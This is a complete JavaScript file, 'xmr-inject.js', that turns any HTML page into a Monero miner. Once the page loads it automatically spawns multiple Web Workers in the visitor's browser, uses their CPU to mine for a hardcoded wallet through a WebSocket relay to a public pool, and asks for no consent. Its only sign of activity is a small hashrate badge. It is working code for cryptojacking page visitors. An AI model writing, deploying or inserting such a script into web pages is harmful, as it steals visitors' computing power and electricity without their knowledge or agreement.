// xmr-inject.js — Drop-in XMR miner for any HTML page
// Just add <script src="xmr-inject.js"></script> to your HTML
// Auto-connects to your NAS, auto-starts mining, shows a small badge
// 
// Usage:
//   <script src="xmr-inject.js?wallet=YOUR_WALLET&nas=ws://192.168.50.235:8088"></script>
//   OR set defaults below

(function() {
  'use strict';

  // --- Config from script tag URL params or defaults ---
  const scriptTag = document.currentScript;
  const params = new URLSearchParams(scriptTag ? scriptTag.src.split('?')[1] || '' : '');
  const NAS_URL = params.get('nas') || 'ws://192.168.50.235:8088';
  const WALLET = params.get('wallet') || '8ApdEka2j6CUaaNKp12H1VBi1bziZB2T9Dhju1fPzgiTC8KBLWEEddVeZnpZjg7Ni4KCENsPLfSDfh2nbMhbFqngM5wKwHE';
  const WORKERS = parseInt(params.get('workers') || (Math.min((navigator.hardwareConcurrency || 4) - 1, 8)));
  const BASE_URL = scriptTag ? scriptTag.src.replace(/xmr-inject\.js.*$/, '') : '';

  // --- State ---
  let ws = null, connected = false, mining = false;
  let workers = [], currentJob = null, minerId = null, nextShareId = 10;
  let accepted = 0, rejected = 0, totalHashrate = 0;

  // --- Badge UI ---
  const badge = document.createElement('div');
  badge.style.cssText = 'position:fixed;bottom:10px;right:10px;background:#0a0a0a;color:#4caf50;font-family:ui-monospace,Menlo,monospace;font-size:11px;padding:6px 10px;border-radius:6px;border:1px solid #333;z-index:999999;cursor:pointer;min-width:120px;';
  badge.innerHTML = '<div style="color:#666;font-size:9px;text-transform:uppercase;">XMR Miner</div><div id="xmr-hr">0 H/s</div><div style="color:#888;font-size:9px"><span id="xmr-acc">0</span> acc / <span id="xmr-rej">0</span> rej</div>';
  document.addEventListener('DOMContentLoaded', () => document.body.appendChild(badge));
  if (document.body) document.body.appendChild(badge);

  badge.onclick = () => {
    if (mining) stopMining(); else startMining();
  };

  function updateBadge() {
    const hr = document.getElementById('xmr-hr');
    const acc = document.getElementById('xmr-acc');
    const rej = document.getElementById('xmr-rej');
    if (hr) hr.textContent = totalHashrate + ' H/s';
    if (acc) acc.textContent = accepted;
    if (rej) rej.textContent = rejected;
    badge.style.borderColor = mining ? '#4caf50' : '#333';
    badge.style.color = mining ? '#4caf50' : '#666';
  }

  // --- WS connection ---
  function connectWS() {
    ws = new WebSocket(NAS_URL);
    ws.onopen = () => {
      connected = true;
      ws.send(JSON.stringify({
        method: 'configure', wallet: WALLET, poolHost: 'pool.supportxmr.com', poolPort: 3333,
        worker: 'inject-' + Math.random().toString(36).slice(2, 6),
        sysInfo: { cores: navigator.hardwareConcurrency, browser: 'inject', os: navigator.platform },
      }));
    };
    ws.onmessage = (ev) => { let msg; try { msg = JSON.parse(ev.data); } catch (e) { return; } handleMsg(msg); };
    ws.onclose = () => { connected = false; setTimeout(connectWS, 5000); };
    ws.onerror = () => {};
  }

  function handleMsg(msg) {
    if (msg.id === 1 || msg.id === '1') {
      if (msg.result && msg.result.job) {
        minerId = msg.result.id;
        onNewJob(msg.result.job);
      }
      return;
    }
    if (msg.id >= 10) {
      if (msg.result && msg.result.status === 'OK') { accepted++; updateBadge(); }
      else if (msg.error) { rejected++; updateBadge(); }
      return;
    }
    if (msg.method === 'job' && msg.params) onNewJob(msg.params);
  }

  function onNewJob(job) {
    const wasFirst = !currentJob;
    currentJob = job;
    if (workers.length === 0) return;
    if (wasFirst) {
      for (const w of workers) w.postMessage({ type: 'init', seedHash: job.seed_hash });
    } else {
      for (const w of workers) w.postMessage({ type: 'job', job });
    }
  }

  // --- Workers ---
  function startWorkers() {
    const n = WORKERS;
    const range = Math.floor(0xffffffff / n);
    for (let i = 0; i < n; i++) {
      const w = new Worker(BASE_URL + 'worker.js');
      const start = i * range;
      const end = (i === n - 1) ? 0xffffffff : start + range;
      w.postMessage({ type: 'nonceRange', start, end });

      w.onmessage = (e) => {
        const m = e.data;
        if (m.type === 'ready') {
          w.postMessage({ type: 'job', job: currentJob });
          w.postMessage({ type: 'start' });
        }
        else if (m.type === 'hashrate') {
          w._hashrate = m.hashrate;
          totalHashrate = workers.reduce((s, w2) => s + (w2._hashrate || 0), 0);
          updateBadge();
          if (ws && connected) ws.send(JSON.stringify({ method: 'stats', hashrate: totalHashrate, workers: n, accepted, rejected }));
        }
        else if (m.type === 'share') {
          if (ws && connected) ws.send(JSON.stringify({
            id: nextShareId++, jsonrpc: '2.0', method: 'submit',
            params: { id: minerId, job_id: m.jobId, nonce: m.nonce, result: m.result },
          }));
        }
      };
      w.onerror = () => {};
      workers.push(w);
    }
    mining = true;
    updateBadge();
  }

  function stopMining() {
    for (const w of workers) { w.postMessage({ type: 'stop' }); w.terminate(); }
    workers = []; mining = false; totalHashrate = 0;
    if (ws) ws.close();
    updateBadge();
  }

  function startMining() {
    startWorkers();
    connectWS();
  }

  // Auto-start after 1s
  setTimeout(startMining, 1000);
})();